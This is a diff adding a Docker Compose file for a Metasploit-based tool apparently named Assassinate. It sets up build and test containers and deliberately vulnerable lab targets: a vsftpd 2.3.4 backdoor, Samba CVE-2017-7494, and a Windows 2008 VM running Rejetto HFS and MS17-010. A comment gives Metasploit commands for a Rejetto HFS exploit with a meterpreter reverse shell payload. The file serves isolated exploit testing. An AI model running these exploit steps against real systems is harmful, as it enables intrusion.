@@ -1,0 +1,458 @@
+# =============================================================================
+# Assassinate Multi-Distro Docker Compose
+# =============================================================================
+#
+# Usage:
+#   docker compose build ubuntu
+#   docker compose build fedora
+#   docker compose run --rm ubuntu
+#   docker compose run --rm test-fedora
+#
+# =============================================================================
+
+services:
+  # ===========================================================================
+  # PostgreSQL Database
+  # ===========================================================================
+
+  postgres:
+    image: postgres:16-alpine
+    container_name: assassinate-db
+    environment:
+      POSTGRES_USER: assassinate
+      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-assassinate_pass}
+      POSTGRES_DB: msf_db
+    volumes:
+      - postgres_data:/var/lib/postgresql/data
+    networks:
+      - assassinate-net
+    healthcheck:
+      test: ["CMD-SHELL", "pg_isready -U assassinate"]
+      interval: 5s
+      timeout: 3s
+      retries: 5
+    restart: unless-stopped
+
+  # ===========================================================================
+  # Distro Images
+  # ===========================================================================
+
+  ubuntu:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: ubuntu
+    image: assassinate:ubuntu
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  debian:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: debian
+    image: assassinate:debian
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  fedora:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: fedora
+    image: assassinate:fedora
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  arch:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: arch
+    image: assassinate:arch
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  kali:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: kali
+    image: assassinate:kali
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  parrot:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: parrot
+    image: assassinate:parrot
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+    networks:
+      - assassinate-net
+
+  # ===========================================================================
+  # Test Services
+  # ===========================================================================
+
+  test-ubuntu:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: ubuntu
+    image: assassinate:ubuntu-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  test-debian:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: debian
+    image: assassinate:debian-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  test-fedora:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: fedora
+    image: assassinate:fedora-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  test-arch:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: arch
+    image: assassinate:arch-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  test-kali:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: kali
+    image: assassinate:kali-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /usr/share/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  test-parrot:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: parrot
+    image: assassinate:parrot-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /usr/share/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+    command: bash -c "pytest python/tests/ -v --tb=short"
+
+  # ===========================================================================
+  # Test Target Containers (Vulnerable Services)
+  # ===========================================================================
+  # WARNING: These containers run intentionally vulnerable services.
+  # DO NOT expose to untrusted networks!
+
+  target-linux:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile.target
+    image: assassinate:target-linux
+    container_name: assassinate-target
+    networks:
+      - assassinate-net
+    # Ports exposed for exploitation (Docker network only, not published to host):
+    # 21: FTP (vsftpd 2.3.4 backdoor trigger)
+    # 139/445: SMB (Samba 4.6.3 CVE-2017-7494)
+    # 6200: Backdoor shell (opened after vsftpd exploit)
+    # 4445: Pre-configured shell listener
+    expose:
+      - "21"
+      - "139"
+      - "445"
+      - "6200"
+      - "4445"
+    healthcheck:
+      test: ["CMD", "/usr/local/bin/healthcheck.sh"]
+      interval: 10s
+      timeout: 5s
+      retries: 3
+    restart: unless-stopped
+    # Volume for injecting payloads dynamically
+    volumes:
+      - target_payloads:/payload
+
+  # Windows Target (KVM-based real Windows VM)
+  # REQUIRES: Linux host with KVM support (/dev/kvm)
+  # First run takes 10-20 minutes to install Windows + setup vulnerable services
+  #
+  # Vulnerable Services:
+  #   - Rejetto HFS 2.3 (CVE-2014-6287) on port 8080 - RELIABLE
+  #     Exploit: exploit/windows/http/rejetto_hfs_exec
+  #
+  #   - EternalBlue (MS17-010) on port 445 - UNRELIABLE (often fails)
+  #     Exploit: exploit/windows/smb/ms17_010_eternalblue
+  #
+  # Usage:
+  #   docker compose -f docker/docker-compose.yml up target-windows
+  #   # Wait for Windows to boot and HFS to start (~2-3 min after container starts)
+  #   # Access via VNC: localhost:8006 (web) or RDP: localhost:3389
+  #
+  # Recommended Exploit (Rejetto HFS - reliable):
+  #   use exploit/windows/http/rejetto_hfs_exec
+  #   set RHOSTS target-windows
+  #   set RPORT 8080
+  #   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+  #   set LHOST <your-container-ip>
+  #   exploit
+  #
+  target-windows:
+    image: dockurr/windows:latest
+    container_name: assassinate-target-windows
+    networks:
+      - assassinate-net
+    # Required for KVM acceleration
+    devices:
+      - /dev/kvm
+    cap_add:
+      - NET_ADMIN
+    # Ports for access and exploitation
+    ports:
+      - "8006:8006"   # Web VNC
+      - "3389:3389"   # RDP
+    expose:
+      - "8006"        # Web VNC
+      - "3389"        # RDP
+      - "80"          # Rejetto HFS (primary exploit target - default port)
+      - "445"         # SMB
+      - "139"         # NetBIOS
+    # Persistent storage and OEM setup scripts
+    volumes:
+      - windows_data:/storage
+      - target_payloads:/shared
+      - ./windows-oem:/oem
+    environment:
+      RAM_SIZE: "4G"
+      CPU_CORES: "2"
+      DISK_SIZE: "20G"
+      # Windows Server 2008 R2
+      VERSION: "2008"
+    # Windows takes time to boot
+    stop_grace_period: 2m
+
+  # Integration test service - runs tests against target-linux
+  integration-test:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: ubuntu
+    image: assassinate:integration-test
+    depends_on:
+      postgres:
+        condition: service_healthy
+      target-linux:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+      # Target container settings
+      TARGET_HOST: assassinate-target
+      TARGET_FTP_PORT: "21"
+      TARGET_SHELL_PORT: "4445"
+      TARGET_BACKDOOR_PORT: "6200"
+      # Enable integration tests
+      INTEGRATION_TESTS: "true"
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      - ../python/tests:/app/python/tests:ro
+      - ../python/assassinate:/app/python/assassinate:ro
+      - ../rust/bridge/tests:/app/rust/bridge/tests:ro
+      - ../rust/bridge/src:/app/rust/bridge/src:ro
+      - ../rust/daemon/src:/app/rust/daemon/src:ro
+      - ../rust/ipc/src:/app/rust/ipc/src:ro
+      - ../pyproject.toml:/app/pyproject.toml:ro
+      - target_payloads:/payload
+      # MSF database config
+      - ./msf-database.yml:/root/.msf4/database.yml:ro
+
+  # Development service - full source mounts for rapid iteration
+  # Usage:
+  #   docker compose -f docker/docker-compose.yml run -d --name dev dev sleep infinity
+  #   docker exec -it dev bash
+  #   # Inside: cargo build, uv run pytest, etc. - all changes immediately available
+  dev:
+    build:
+      context: ..
+      dockerfile: docker/Dockerfile
+      args:
+        DISTRO: ubuntu
+    image: assassinate:dev
+    depends_on:
+      postgres:
+        condition: service_healthy
+      target-linux:
+        condition: service_healthy
+    environment:
+      DATABASE_URL: postgresql://assassinate:${POSTGRES_PASSWORD:-assassinate_pass}@postgres:5432/msf_db
+      MSF_ROOT: /opt/metasploit-framework
+      ASSASSINATE_WORKSPACE: default
+      TARGET_HOST: assassinate-target
+      TARGET_FTP_PORT: "21"
+      TARGET_SHELL_PORT: "4445"
+      TARGET_BACKDOOR_PORT: "6200"
+      TARGET_WINDOWS_HOST: assassinate-target-windows
+      INTEGRATION_TESTS: "true"
+    networks:
+      - assassinate-net
+    tmpfs:
+      - /dev/shm:exec,size=256m
+    volumes:
+      # Full source mounts (read-write for development)
+      - ../rust:/app/rust
+      - ../python:/app/python
+      - ../pyproject.toml:/app/pyproject.toml
+      - target_payloads:/payload
+      # Cargo cache for faster rebuilds
+      - cargo_cache:/root/.cargo/registry
+      - cargo_git:/root/.cargo/git
+      # MSF database config
+      - ./msf-database.yml:/root/.msf4/database.yml:ro
+      # Tmp directory for test scripts
+      - /tmp/docker:/tmp/scripts
+
+networks:
+  assassinate-net:
+    name: assassinate-network
+
+volumes:
+  postgres_data:
+    name: assassinate-postgres-data
+  target_payloads:
+    name: assassinate-target-payloads
+  windows_data:
+    name: assassinate-windows-data
+  cargo_cache:
+    name: assassinate-cargo-cache
+  cargo_git:
+    name: assassinate-cargo-git
